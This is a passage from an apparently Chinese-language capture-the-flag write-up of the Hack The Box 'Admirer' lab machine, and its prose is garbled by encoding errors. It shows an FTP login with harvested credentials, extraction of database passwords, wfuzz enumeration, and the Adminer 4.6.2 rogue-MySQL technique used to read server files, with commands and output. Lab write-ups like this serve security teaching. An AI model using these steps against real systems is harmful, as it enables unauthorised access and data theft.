title="0x04.TFPç™»å…¥"></a>0x04.TFPç™»å…¥</h2><p><code>å‘ç°ä¸€ä¸ªsqlæ–‡ä»¶ä¸ç½‘ç«™æ ¹ç›®å½•æ–‡ä»¶</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">root@JIYE:~/htb/admirer<span class="comment"># cat ftp.dic </span></span><br><span class="line">ftpuser   %n?4Wz&#125;R<span class="variable">$tTF7</span></span><br><span class="line">root@JIYE:~/htb/admirer<span class="comment"># ftp 10.10.10.187</span></span><br><span class="line">Connected to 10.10.10.187.</span><br><span class="line">220 (vsFTPd 3.0.3)</span><br><span class="line">Name (10.10.10.187:root): ftpuser</span><br><span class="line">331 Please specify the password.</span><br><span class="line">Password:</span><br><span class="line">230 Login successful.</span><br><span class="line">Remote system <span class="built_in">type</span> is UNIX.</span><br><span class="line">Using binary mode to transfer files.</span><br><span class="line">ftp&gt; ls</span><br><span class="line">200 PORT <span class="built_in">command</span> successful. Consider using PASV.</span><br><span class="line">150 Here comes the directory listing.</span><br><span class="line">-rw-r--r--    1 0        0            3405 Dec 02  2019 dump.sql</span><br><span class="line">-rw-r--r--    1 0        0         5270987 Dec 03  2019 html.tar.gz</span><br><span class="line">226 Directory send OK.</span><br><span class="line">ftp&gt;</span><br></pre></td></tr></table></figure><p><code>ä¸‹è½½</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">ftp&gt; get dump.sql</span><br><span class="line"><span class="built_in">local</span>: dump.sql remote: dump.sql</span><br><span class="line">200 PORT <span class="built_in">command</span> successful. Consider using PASV.</span><br><span class="line">150 Opening BINARY mode data connection <span class="keyword">for</span> dump.sql (3405 bytes).</span><br><span class="line">226 Transfer complete.</span><br><span class="line">3405 bytes received <span class="keyword">in</span> 0.07 secs (46.7245 kB/s)</span><br><span class="line">ftp&gt; get html.tar.gz</span><br><span class="line"><span class="built_in">local</span>: html.tar.gz remote: html.tar.gz</span><br><span class="line">200 PORT <span class="built_in">command</span> successful. Consider using PASV.</span><br><span class="line">150 Opening BINARY mode data connection <span class="keyword">for</span> html.tar.gz (5270987 bytes).</span><br><span class="line">226 Transfer complete.</span><br><span class="line">5270987 bytes received <span class="keyword">in</span> 10.78 secs (477.4579 kB/s)</span><br><span class="line">ftp&gt; <span class="built_in">exit</span></span><br><span class="line">221 Goodbye.</span><br><span class="line">root@JIYE:~/htb/admirer<span class="comment"># ls</span></span><br><span class="line">big.txt  dump.sql  ftp.dic  html.tar.gz  nmap.CVT</span><br><span class="line">root@JIYE:~/htb/admirer<span class="comment">#</span></span><br></pre></td></tr></table></figure><blockquote><p>è§£å‹è¿›è¡ŒæŸ¥çœ‹ï¼Œå‘ç°æ ¹ç›®å½•ä¸‹å­˜åœ¨utility-scriptsç›®å½•ï¼Œå¹¶ä¸”ä¹Ÿå‘ç°äº†æ•°æ®åº“çš„ä¸€ä¸ªç”¨æˆ·åä¸å¯†ç </p></blockquote><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">root@JIYE:~/htb/admirer/html<span class="comment"># ls</span></span><br><span class="line">assets  images  index.php  robots.txt  utility-scripts  w4ld0s_s3cr3t_d1r</span><br><span class="line">root@JIYE:~/htb/admirer/html<span class="comment"># cd utility-scripts/</span></span><br><span class="line">root@JIYE:~/htb/admirer/html/utility-scripts<span class="comment"># ls</span></span><br><span class="line">admin_tasks.php  db_admin.php  info.php  phptest.php</span><br><span class="line">root@JIYE:~/htb/admirer/html/utility-scripts<span class="comment"># cat db_admin.php </span></span><br><span class="line">&lt;?php</span><br><span class="line">  <span class="variable">$servername</span> = <span class="string">&quot;localhost&quot;</span>;</span><br><span class="line">  <span class="variable">$username</span> = <span class="string">&quot;waldo&quot;</span>;</span><br><span class="line">  <span class="variable">$password</span> = <span class="string">&quot;Wh3r3_1s_w4ld0?&quot;</span>;</span><br><span class="line"></span><br><span class="line">  // Create connection</span><br><span class="line">  <span class="variable">$conn</span> = new mysqli(<span class="variable">$servername</span>, <span class="variable">$username</span>, <span class="variable">$password</span>);</span><br><span class="line"></span><br><span class="line">  // Check connection</span><br><span class="line">  <span class="keyword">if</span> (<span class="variable">$conn</span>-&gt;connect_error) &#123;</span><br><span class="line">      die(<span class="string">&quot;Connection failed: &quot;</span> . <span class="variable">$conn</span>-&gt;connect_error);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">echo</span> <span class="string">&quot;Connected successfully&quot;</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">  // TODO: Finish implementing this or find a better open <span class="built_in">source</span> alternative</span><br><span class="line">?&gt;</span><br><span class="line">root@JIYE:~/htb/admirer/html/utility-scripts<span class="comment">#</span></span><br></pre></td></tr></table></figure><blockquote><p>ä¹Ÿå‘ç°äº†ç½‘ç«™ç”¨æˆ·åä¸å¯†ç ï¼Œå°è¯•sshç™»å…¥ä½†æ˜¯å¤±è´¥äº†ï¼Œåº”è¯¥æ˜¯è¿‡æœŸäº†ã€‚</p></blockquote><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">root@JIYE:~/htb/admirer/html<span class="comment"># cat index.php  | grep username</span></span><br><span class="line">                        <span class="variable">$username</span> = <span class="string">&quot;waldo&quot;</span>;</span><br><span class="line">                        <span class="variable">$conn</span> = new mysqli(<span class="variable">$servername</span>, <span class="variable">$username</span>, <span class="variable">$password</span>, <span class="variable">$dbname</span>);</span><br><span class="line">root@JIYE:~/htb/admirer/html<span class="comment"># cat index.php  | grep password</span></span><br><span class="line">                        <span class="variable">$password</span> = <span class="string">&quot;]F7jLHw:*G&gt;UPrTo&#125;~A&quot;</span>d6b<span class="string">&quot;;</span></span><br><span class="line"><span class="string">                        <span class="variable">$conn</span> = new mysqli(<span class="variable">$servername</span>, <span class="variable">$username</span>, <span class="variable">$password</span>, <span class="variable">$dbname</span>);</span></span><br></pre></td></tr></table></figure><h2 id="0x05-è®¿é—®utility-scripts"><a href="#0x05-è®¿é—®utility-scripts" class="headerlink" title="0x05.è®¿é—®utility-scripts"></a>0x05.è®¿é—®utility-scripts</h2><p><code>ä¾ç„¶æ²¡æœ‰æƒé™ï¼Œå‘ç°ä¸‰ä¸ªç›®å½•</code></p><img src="/2020/09/05/HTB-admirer/image-20200905144337702.png" class><p><code>å†æ¬¡è¿›è¡ŒFUZZæµ‹è¯•</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">root@JIYE:~/htb/admirer<span class="comment"># wfuzz -c -w big.txt -z list,txt-php-html -u http://10.10.10.187/utility-scripts/FUZZ.FUZ2Z --hc 404,403 -t 50</span></span><br><span class="line"></span><br><span class="line">Warning: Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz<span class="string">&#x27;s documentation for more information.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">********************************************************</span></span><br><span class="line"><span class="string">* Wfuzz 2.4.5 - The Web Fuzzer                         *</span></span><br><span class="line"><span class="string">********************************************************</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Target: http://10.10.10.187/utility-scripts/FUZZ.FUZ2Z</span></span><br><span class="line"><span class="string">Total requests: 61419</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">===================================================================</span></span><br><span class="line"><span class="string">ID           Response   Lines    Word     Chars       Payload                                                                                     </span></span><br><span class="line"><span class="string">===================================================================</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">000005618:   200        51 L     235 W    4157 Ch     &quot;adminer - php&quot;                                                                             </span></span><br><span class="line"><span class="string">000028853:   200        964 L    4976 W   84030 Ch    &quot;info - php&quot;                                                                                </span></span><br><span class="line"><span class="string">000041603:   200        0 L      8 W      32 Ch       &quot;phptest - php&quot;                                                                             </span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Total time: 496.4518</span></span><br><span class="line"><span class="string">Processed Requests: 61419</span></span><br><span class="line"><span class="string">Filtered Requests: 61416</span></span><br><span class="line"><span class="string">Requests/sec.: 123.7159</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">root@JIYE:~/htb/admirer# </span></span><br></pre></td></tr></table></figure><blockquote><p>ä¾æ¬¡è®¿é—®ï¼Œå‘ç°adminer.phpä¸ºæ•°æ®åº“ç®¡ç†ç³»ç»Ÿï¼ˆv4.62ï¼‰ç™»å…¥é¡µé¢</p></blockquote><img src="/2020/09/05/HTB-admirer/image-20200905150106096.png" class><h2 id="0x06-adminer-v4-62-æ¼æ´åˆ©ç”¨å‚è€ƒ"><a href="#0x06-adminer-v4-62-æ¼æ´åˆ©ç”¨å‚è€ƒ" class="headerlink" title="0x06.adminer(v4.62)æ¼æ´åˆ©ç”¨å‚è€ƒ"></a>0x06.adminer(v4.62)æ¼æ´åˆ©ç”¨<span class="exturl" data-url="aHR0cHM6Ly93d3cuZm9yZWdlbml4LmNvbS9ibG9nL3NlcmlvdXMtdnVsbmVyYWJpbGl0eS1kaXNjb3ZlcmVkLWluLWFkbWluZXItdG9vbA==">å‚è€ƒ<i class="fa fa-external-link-alt"></i></span></h2><blockquote><p>å‚è€ƒä¸­è¯´ï¼Œè¯¥æ¼æ´å¯ä»¥â€œåå‘â€è¿æ¥åˆ°æ‰˜ç®¡åœ¨è‡ªå·±æœåŠ¡å™¨ä¸Šçš„MySQLæ•°æ®åº“ã€‚</p></blockquote><p><code>exploit</code></p><h3 id="1-é¦–å…ˆå¯åŠ¨mysql"><a href="#1-é¦–å…ˆå¯åŠ¨mysql" class="headerlink" title="1.é¦–å…ˆå¯åŠ¨mysql"></a>1.é¦–å…ˆå¯åŠ¨mysql</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">root@JIYE:~/htb/admirer<span class="comment"># systemctl start mysql</span></span><br></pre></td></tr></table></figure><h3 id="2-åˆ›å»ºä¸€ä¸ªæ•°æ®åº“ç”¨äºè¿æ¥"><a href="#2-åˆ›å»ºä¸€ä¸ªæ•°æ®åº“ç”¨äºè¿æ¥" class="headerlink" title="2.åˆ›å»ºä¸€ä¸ªæ•°æ®åº“ç”¨äºè¿æ¥"></a>2.åˆ›å»ºä¸€ä¸ªæ•°æ®åº“ç”¨äºè¿æ¥</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">MariaDB [(none)]&gt; create database admirer;</span><br><span class="line">Query OK, 1 row affected (0.000 sec)</span><br><span class="line"></span><br><span class="line">MariaDB [(none)]&gt; </span><br></pre></td></tr></table></figure><h3 id="3-åˆ›å»ºä¸€ä¸ªç”¨æˆ·"><a href="#3-åˆ›å»ºä¸€ä¸ªç”¨æˆ·" class="headerlink" title="3.åˆ›å»ºä¸€ä¸ªç”¨æˆ·"></a>3.åˆ›å»ºä¸€ä¸ªç”¨æˆ·</h3><blockquote><p>æ­¤ç”¨æˆ·å¯†ç ä¸ºdemoï¼Œå¯ä»¥åœ¨ä»»æ„ä¸»æœºç™»å…¥</p></blockquote><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">MariaDB [(none)]&gt; create user <span class="string">&#x27;demo&#x27;</span>@<span class="string">&#x27;%&#x27;</span> identified by <span class="string">&#x27;demo&#x27;</span>;</span><br><span class="line">Query OK, 0 rows affected (0.003 sec)</span><br><span class="line"></span><br><span class="line">MariaDB [(none)]&gt;</span><br></pre></td></tr></table></figure><h3 id="4-èµ‹äºˆrootæƒé™ç»™demo"><a href="#4-èµ‹äºˆrootæƒé™ç»™demo" class="headerlink" title="4.èµ‹äºˆrootæƒé™ç»™demo"></a>4.èµ‹äºˆrootæƒé™ç»™demo</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">MariaDB [(none)]&gt; grant all privileges on * . * to <span class="string">&#x27;demo&#x27;</span>@<span class="string">&#x27;%&#x27;</span>;</span><br><span class="line">Query OK, 0 rows affected (0.000 sec)</span><br><span class="line"></span><br><span class="line">MariaDB [(none)]&gt; flush privileges;</span><br><span class="line">Query OK, 0 rows affected (0.000 sec)</span><br><span class="line"></span><br><span class="line">MariaDB [(none)]&gt;</span><br></pre></td></tr></table></figure><h3 id="5-åˆ›å»ºä¸€ä¸ªè¡¨"><a href="#5-åˆ›å»ºä¸€ä¸ªè¡¨" class="headerlink" title="5.åˆ›å»ºä¸€ä¸ªè¡¨"></a>5.åˆ›å»ºä¸€ä¸ªè¡¨</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">MariaDB [(none)]&gt; show databases;</span><br><span class="line">+--------------------+</span><br><span class="line">| Database           |</span><br><span class="line">+--------------------+</span><br><span class="line">| admirer            |</span><br><span class="line">| information_schema |</span><br><span class="line">| mysql              |</span><br><span class="line">| performance_schema |</span><br><span class="line">+--------------------+</span><br><span class="line">4 rows <span class="keyword">in</span> <span class="built_in">set</span> (0.001 sec)</span><br><span class="line"></span><br><span class="line">MariaDB [(none)]&gt; use admirer;</span><br><span class="line">Database changed</span><br><span class="line">MariaDB [admirer]&gt; create table <span class="built_in">test</span> (data varchar(225));</span><br><span class="line">Query OK, 0 rows affected (0.007 sec)</span><br><span class="line"></span><br><span class="line">MariaDB [admirer]&gt; show tables;</span><br><span class="line">+-------------------+</span><br><span class="line">| Tables_in_admirer |</span><br><span class="line">+-------------------+</span><br><span class="line">| <span class="built_in">test</span>              |</span><br><span class="line">+-------------------+</span><br><span class="line">1 row <span class="keyword">in</span> <span class="built_in">set</span> (0.000 sec)</span><br><span class="line"></span><br><span class="line">MariaDB [admirer]&gt;</span><br></pre></td></tr></table></figure><h3 id="6-ä¿®æ”¹MySQLé…ç½®æ–‡ä»¶ï¼Œå…è®¸ä»»æ„åœ°å€è®¿é—®"><a href="#6-ä¿®æ”¹MySQLé…ç½®æ–‡ä»¶ï¼Œå…è®¸ä»»æ„åœ°å€è®¿é—®" class="headerlink" title="6.ä¿®æ”¹MySQLé…ç½®æ–‡ä»¶ï¼Œå…è®¸ä»»æ„åœ°å€è®¿é—®"></a>6.ä¿®æ”¹MySQLé…ç½®æ–‡ä»¶ï¼Œå…è®¸ä»»æ„åœ°å€è®¿é—®</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">root@JIYE:/etc/mysql/mariadb.conf.d<span class="comment"># vim 50-server.cnf</span></span><br><span class="line">Â·Â·Â·</span><br><span class="line"><span class="built_in">bind</span>-address            = 0.0.0.0</span><br><span class="line">Â·Â·Â·</span><br><span class="line">root@JIYE:/etc/mysql/mariadb.conf.d<span class="comment"># systemctl restart mysql</span></span><br></pre></td></tr></table></figure><h3 id="7-demoç™»å…¥æµ‹è¯•"><a href="#7-demoç™»å…¥æµ‹è¯•" class="headerlink" title="7.demoç™»å…¥æµ‹è¯•"></a>7.demoç™»å…¥æµ‹è¯•</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">root@JIYE:~<span class="comment"># mysql -h localhost -udemo -pdemo</span></span><br><span class="line">Welcome to the MariaDB monitor.  Commands end with ; or \g.</span><br><span class="line">Your MariaDB connection id is 38</span><br><span class="line">Server version: 10.3.23-MariaDB-1 Debian buildd-unstable</span><br><span class="line"></span><br><span class="line">Copyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others.</span><br><span class="line"></span><br><span class="line">Type <span class="string">&#x27;help;&#x27;</span> or <span class="string">&#x27;\h&#x27;</span> <span class="keyword">for</span> <span class="built_in">help</span>. Type <span class="string">&#x27;\c&#x27;</span> to clear the current input statement.</span><br><span class="line"></span><br><span class="line">MariaDB [(none)]&gt;</span><br></pre></td></tr></table></figure><h2 id="0x07-admirerç™»å…¥"><a href="#0x07-admirerç™»å…¥" class="headerlink" title="0x07.admirerç™»å…¥"></a>0x07.admirerç™»å…¥</h2><img src="/2020/09/05/HTB-admirer/image-20200905154605597.png" class><img src="/2020/09/05/HTB-admirer/image-20200905155937645.png" class><h3 id="1-å¯¼å…¥-etc-passwdåˆ°test"><a href="#1-å¯¼å…¥-etc-passwdåˆ°test" class="headerlink" title="1.å¯¼å…¥/etc/passwdåˆ°test"></a>1.å¯¼å…¥/etc/passwdåˆ°test</h3><p><code>ä¸èƒ½å¯¼å…¥</code></p><img src="/2020/09/05/HTB-admirer/image-20200905160349472.png" class><h3 id="2-å¯¼å…¥-var-www-html-index-phpåˆ°test"><a href="#2-å¯¼å…¥-var-www-html-index-phpåˆ°test" class="headerlink" title="2.å¯¼å…¥/var/www/html/index.phpåˆ°test"></a>2.å¯¼å…¥/var/www/html/index.phpåˆ°test</h3><p><code>å¯¼å…¥æˆåŠŸ</code></p><img src="/2020/09/05/HTB-admirer/image-20200905160705558.png" class><h3 id="3-å¯¼å‡ºtestè¡¨"><a href="#3-å¯¼å‡ºtestè¡¨" class="headerlink" title="3.å¯¼å‡ºtestè¡¨"></a>3.å¯¼å‡ºtestè¡¨</h3><img src="/2020/09/05/HTB-admirer/image-20200905160805405.png" class><p><code>å¯¼å‡ºæ–‡ä»¶å†…å®¹å¦‚ä¸‹</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br></pre></td><td class="code"><pre><span class="line">-- Adminer <span class="number">4.6</span><span class="number">.2</span> MySQL dump</span><br><span class="line"></span><br><span class="line">SET NAMES utf8;</span><br><span class="line">SET time_zone = <span class="string">&#x27;+00:00&#x27;</span>;</span><br><span class="line">SET foreign_key_checks = <span class="number">0</span>;</span><br><span class="line">SET sql_mode = <span class="string">&#x27;NO_AUTO_VALUE_ON_ZERO&#x27;</span>;</span><br><span class="line"></span><br><span class="line">SET NAMES utf8mb4;</span><br><span class="line"></span><br><span class="line">DROP TABLE <span class="keyword">IF</span> EXISTS `test`;</span><br><span class="line">CREATE TABLE `test` (</span><br><span class="line">  `data` varchar(<span class="number">225</span>) <span class="keyword">DEFAULT</span> <span class="literal">NULL</span></span><br><span class="line">) ENGINE=InnoDB <span class="keyword">DEFAULT</span> CHARSET=utf8mb4;</span><br><span class="line"></span><br><span class="line">INSERT INTO `test` (`data`) VALUES</span><br><span class="line">(<span class="string">&#x27;&lt;!DOCTYPE HTML&gt;&#x27;</span>),</span><br><span class="line">(<span class="string">&#x27;&lt;!--&#x27;</span>),</span><br><span class="line">(<span class="string">&#x27;    Multiverse by HTML5 UP&#x27;</span>),</span><br><span class="line">(<span class="string">&#x27;    html5up.net | @ajlkn&#x27;</span>),</span><br><span class="line">(<span class="string">&#x27;    Free for personal and commercial use under the CCA 3.0 license (html5up.net/license)&#x27;</span>),</span><br><span class="line">(<span class="string">&#x27;--&gt;&#x27;</span>),</span><br><span class="line">(<span class="string">&#x27;&lt;html&gt;&#x27;</span>),</span><br><span class="line">(<span class="string">&#x27;    &lt;head&gt;&#x27;</span>),</span><br><span class="line">(<span class="string">&#x27;        &lt;title&gt;Admirer&lt;/title&gt;&#x27;</span>),</span><br><span class="line">(<span class="string">&#x27;        &lt;meta charset=\&quot;utf-8\&quot; /&gt;&#x27;</span>),</span><br><span class="line">(<span class="string">&#x27;        &lt;meta name=\&quot;viewport\&quot; content=\&quot;width=device-width, initial-scale=1, user-scalable=no\&quot; /&gt;&#x27;</span>),</span><br><span class="line">(<span class="string">&#x27;        &lt;link rel=\&quot;stylesheet\&quot; href=\&quot;assets/css/main.css\&quot; /&gt;&#x27;</span>),</span><br><span class="line">(<span class="string">&#x27;        &lt;noscript&gt;&lt;link rel=\&quot;stylesheet\&quot; href=\&quot;assets/css&#x27;</span>),</span><br><span class="line">(<span class="string">&#x27;    &lt;/head&gt;&#x27;</span>),</span><br><span class="line">(<span class="string">&#x27;    &lt;body class=\&quot;is-preload\&quot;&gt;&#x27;</span>),</span><br><span class="line">(<span class="string">&#x27;&#x27;</span>),</span><br><span class="line">(<span class="string">&#x27;        &lt;!-- Wrapper --&gt;&#x27;</span>),</span><br><span class="line">(<span class="string">&#x27;            &lt;div id=\&quot;wrapper\&quot;&gt;&#x27;</span>),</span><br><span class="line">(<span class="string">&#x27;&#x27;</span>),</span><br><span class="line">(<span class="string">&#x27;                &lt;!-- Header --&gt;&#x27;</span>),</span><br><span class="line">(<span class="string">&#x27;                    &lt;header id=\&quot;header\&quot;&gt;&#x27;</span>),</span><br><span class="line">(<span class="string">&#x27;                        &lt;h1&gt;&lt;a href=\&quot;index.html\&quot;&gt;&lt;strong&gt;Admirer&lt;/strong&gt; of skills and visuals&lt;/a&gt;&lt;/h1&gt;&#x27;</span>),</span><br><span class="line">(<span class="string">&#x27;                        &lt;nav&gt;&#x27;</span>),</span><br><span class="line">(<span class="string">&#x27;                            &lt;ul&gt;&#x27;</span>),</span><br><span class="line">(<span class="string">&#x27;                                &lt;li&gt;&lt;a href=\&quot;#footer\&quot; class=\&quot;icon solid fa-info-circle\&quot;&gt;About&lt;/a&gt;&lt;/li&gt;&#x27;</span>),</span><br><span class="line">(<span class="string">&#x27;                            &lt;/ul&gt;&#x27;</span>),</span><br><span class="line">(<span class="string">&#x27;                        &lt;&#x27;</span>),</span><br><span class="line">(<span class="string">&#x27;                    &lt;/header&gt;&#x27;</span>),</span><br><span class="line">(<span class="string">&#x27;&#x27;</span>),</span><br><span class="line">(<span class="string">&#x27;                &lt;!-- Main --&gt;&#x27;</span>),</span><br><span class="line">(<span class="string">&#x27;                    &lt;div id=\&quot;main\&quot;&gt;            &#x27;</span>),</span><br><span class="line">(<span class="string">&#x27;                     &lt;?php&#x27;</span>),</span><br><span class="line">(<span class="string">&#x27;                        $servername = \&quot;localhost\&quot;;&#x27;</span>),</span><br><span class="line">(<span class="string">&#x27;                        $username = \&quot;waldo\&quot;;&#x27;</span>),</span><br><span class="line">(<span class="string">&#x27;                        $password = \&quot;&amp;&lt;h5b~yK3F#&#123;PaPB&amp;dA&#125;&#123;H&gt;\&quot;;&#x27;</span>),</span><br><span class="line">(<span class="string">&#x27;                        $dbname = \&quot;admirerdb\&quot;;&#x27;</span>),</span><br><span class="line">(<span class="string">&#x27;&#x27;</span>),</span><br><span class="line">(<span class="string">&#x27;                        // Create connection&#x27;</span>),</span><br><span class="line">(<span class="string">&#x27;                        $conn = new mysqli($servername, $username, $password, $dbname);&#x27;</span>),</span><br><span class="line">(<span class="string">&#x27;                        // Check connection&#x27;</span>),</span><br><span class="line">(<span class="string">&#x27;                        if ($conn-&gt;connect_error) &#123;&#x27;</span>),</span><br><span class="line">(<span class="string">&#x27;                            die(\&quot;Connection failed: \&quot; . $conn-&gt;connect_error);&#x27;</span>),</span><br><span class="line">(<span class="string">&#x27;                        &#125;&#x27;</span>),</span><br><span class="line">(<span class="string">&#x27;&#x27;</span>),</span><br><span class="line">(<span class="string">&#x27;                        $sql = \&quot;SELECT * FROM items\&quot;;&#x27;</span>),</span><br><span class="line">(<span class="string">&#x27;                        $result = $conn-&gt;query($sql);&#x27;</span>),</span><br><span class="line">(<span class="string">&#x27;&#x27;</span>),</span><br><span class="line">(<span class="string">&#x27;                        if ($result-&gt;num_rows &gt; 0) &#123;&#x27;</span>),</span><br><span class="line">(<span class="string">&#x27;                            // output data of each row&#x27;</span>),</span><br><span class="line">(<span class="string">&#x27;                            while($row = $result-&gt;fetch_assoc()) &#123;&#x27;</span>),</span><br><span class="line">(<span class="string">&#x27;                                echo \&quot;&lt;article 